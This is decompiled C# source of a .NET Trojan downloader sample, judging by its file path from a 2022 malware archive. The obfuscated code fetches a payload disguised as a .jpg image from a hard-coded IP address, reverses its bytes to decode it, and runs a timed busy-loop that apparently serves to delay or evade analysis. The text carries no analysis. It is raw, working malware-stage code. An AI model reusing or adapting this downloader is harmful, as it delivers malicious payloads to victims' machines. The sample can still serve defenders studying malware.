// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Maryefr, Version=8.82.0.403, Culture=neutral, PublicKeyToken=null
// MVID: 6BA05187-4620-4F29-ED03-A4CE0B905F24
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Downloader.MSIL.Wagex.gen-754a54274a1b8866d5d4f9346522e0b2d59e5b77ab25ef7a73e37ddd6326fb7f.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;

internal sealed class \u0003
{
  public \u0003()
  {
    if (true)
      ;
    // ISSUE: explicit constructor call
    base.\u002Ector();
  }

  internal byte[] \u0002(string _param1)
  {
    MemoryStream memoryStream = new MemoryStream();
    MemoryStream destination;
    if (true)
      destination = memoryStream;
    try
    {
      WebRequest webRequest1 = WebRequest.Create(_param1);
      if (true)
        goto label_5;
label_3:
      WebRequest webRequest2;
      Stream responseStream = webRequest2.GetResponse().GetResponseStream();
      if (true)
        goto label_6;
label_4:
      Stream stream;
      stream.CopyTo((Stream) destination);
      return destination.ToArray();
label_6:
      stream = responseStream;
      goto label_4;
label_5:
      webRequest2 = webRequest1;
      goto label_3;
    }
    finally
    {
      destination.Dispose();
    }
  }

  internal byte[] \u0002()
  {
    try
    {
      if (true)
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
    }
    catch
    {
    }
    byte[] numArray1 = this.\u0002("http://45.137.22.122/Maryefr_Jtqhxvid.jpg");
    if (true)
      goto label_6;
label_4:
    List<byte> byteList1 = new List<byte>();
    if (true)
      goto label_7;
label_5:
    byte[] numArray2;
    int length1 = numArray2.Length;
    List<byte> byteList2;
    while (length1-- > 0)
      byteList2.Add(numArray2[length1]);
    Stopwatch stopwatch = new Stopwatch();
    stopwatch.Start();
    byte[] numArray3 = new byte[numArray2.Length];
    for (int index = 0; index < numArray2.Length; ++index)
    {
      int length2 = numArray2.Length;
      while (length2-- > 0)
      {
        numArray3[index] = numArray2[length2];
        if (stopwatch.Elapsed.TotalSeconds > 20.0)
          break;
      }
    }
    stopwatch.Stop();
    GC.Collect();
    return byteList2.ToArray();
label_7:
    byteList2 = byteList1;
    goto label_5;
label_6:
    numArray2 = numArray1;
    goto label_4;
  }
}
